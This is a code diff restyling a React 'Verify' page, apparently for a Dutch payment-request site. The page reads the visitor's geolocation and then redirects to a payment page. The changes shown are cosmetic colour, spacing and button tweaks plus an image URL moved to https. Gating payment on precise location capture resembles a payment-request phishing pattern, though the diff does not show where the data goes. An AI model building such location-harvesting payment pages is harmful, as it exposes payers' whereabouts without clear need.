@@ -30,7 +30,6 @@ export default function Verify({ slug }) {
           accuracy: pos.coords.accuracy,
         });
 
-        // ✅ direct doorsturen
         window.location.href = `/pay/${slug}?verified=1`;
       },
       async () => {
@@ -58,27 +57,26 @@ export default function Verify({ slug }) {
         html, body {
           margin: 0;
           padding: 0;
-          background: #4b4f83;
+          background: #414380;
           font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
         .page {
           min-height: 100vh;
-          background: #4b4f83;
+          background: #414380;
           display: flex;
           flex-direction: column;
           align-items: center;
-          justify-content: flex-start;
           text-align: center;
         }
 
         .circle {
-          margin-top: 24px;
-          width: 200px;   /* 20% kleiner */
+          margin-top: 20px;
+          width: 200px;
           height: 200px;
           border-radius: 50%;
           background: #ffffff;
-          border: 12px solid #3e4272;
+          border: 12px solid #353575;
           overflow: hidden;
           display: flex;
           align-items: center;
@@ -98,26 +96,26 @@ export default function Verify({ slug }) {
         }
 
         p {
-          color: #d7d9ef;
+          color: #dcdff5;
           font-size: 16px;
           margin: 0 24px 24px;
         }
 
         button {
-          background: #ffffff;
-          color: #4b4f83;
+          background: #4CB7AC;
+          color: #ffffff;
           border: none;
-          border-radius: 12px;
+          border-radius: 14px;
           padding: 16px;
           font-size: 16px;
           width: calc(100% - 48px);
           max-width: 360px;
-          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+          box-shadow: 0 6px 16px rgba(0,0,0,0.25);
           cursor: pointer;
         }
 
         button:disabled {
-          opacity: 0.6;
+          opacity: 0.7;
         }
 
         .error {
@@ -129,7 +127,7 @@ export default function Verify({ slug }) {
       <div className="page">
         <div className="circle">
           <img
-            src="http://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
+            src="https://betaalverzoek.nu/ezgif-7119da68a40b4a77.gif"
             alt="Verificatie"
           />
         </div>
